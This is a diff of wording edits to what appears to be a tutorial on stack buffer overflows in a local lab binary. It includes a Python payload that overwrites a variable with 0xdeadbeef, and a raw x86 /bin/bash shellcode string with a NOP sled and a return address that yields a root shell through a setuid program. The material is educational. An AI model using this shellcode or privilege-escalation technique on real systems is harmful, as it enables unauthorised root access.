@@ -176,7 +176,7 @@ No registers.
 gdb$
 ```
 
-So, we overwrote the check variable with our buffer, as 0x41 is the hex code for ascii 'A' so 0x41414141 is equivalent to `AAAA`.   To get our shell spawned, we need to overwrite our variable with `0xdeadbeef`, so we just write a file containing `A*40` followed by the bytes for 0xdeadbeef.  Code of the following form achieves this:
+So, we overwrote the check variable with our buffer, as 0x41 is the hex code for ascii 'A' so `0x41414141` is equivalent to `AAAA`.   To get our shell spawned, we need to overwrite our variable with `0xdeadbeef`, so we just write a file containing `A*40` followed by the bytes for `0xdeadbeef`.  Code of the following form achieves this:
 
 ```python
 import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)
@@ -204,7 +204,7 @@ Opening your shell...
 Shell closed! Bye.
 ```
 
-So to summarise, via an overflow, and an understanding of the stack, we've effectively corrupted and overwritten a stack variable via an overflow.
+So to summarise, using our understanding of the stack we've effectively corrupted and overwritten a stack variable via an overflow.
 
 The stack
 ----------
@@ -423,14 +423,14 @@ ubuntu@ubuntu:/tmp$ ./test
 Wanna Smash!?: 0xffffcfd0
 ```
 
-In our payload we then place the following shellcode: [http://shell-storm.org/shellcode/files/shellcode-606.php](http://shell-storm.org/shellcode/files/shellcode-606.php)
+In our payload we then place the following shellcode to return us a shell: [http://shell-storm.org/shellcode/files/shellcode-606.php](http://shell-storm.org/shellcode/files/shellcode-606.php)
 ```python
 python -c "from struct import pack; print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'.ljust(140,'\x90') +  pack('<L', 0xffffcfd0)"  > /tmp/var
 ```
 
-You'll notice here I've used `ljust` on the shellcode.  This just pads the string to the determined length of 140 and pads it with NOP instructions, so it makes the process of creating a nopsled slightly easier.  For example, if we were to replace the shellcode, no other adjustments would be necessary.  
+You'll notice here I've used `ljust` on the shellcode.  This just pads the string to the determined length of 140 with `NOP` instructions.  This makes the process of creating a nopsled slightly easier.  For example, if we were to replace the shellcode, we would just replace the string and the payload would still be of length 140.  
 
-We run the binary, inputting the payload, and we are returned a root shell.  The uid won't change but the [effective-uid](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id) or the euid does, meaning we now have root privileges.
+We run the binary, inputting the payload, and we are returned a root shell.  The uid won't change but the [effective-uid](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id) or the euid does to 0, meaning we now have root privileges.
 
 ```bash
 ubuntu@ubuntu:/tmp$ (cat /tmp/var; cat) | ./test
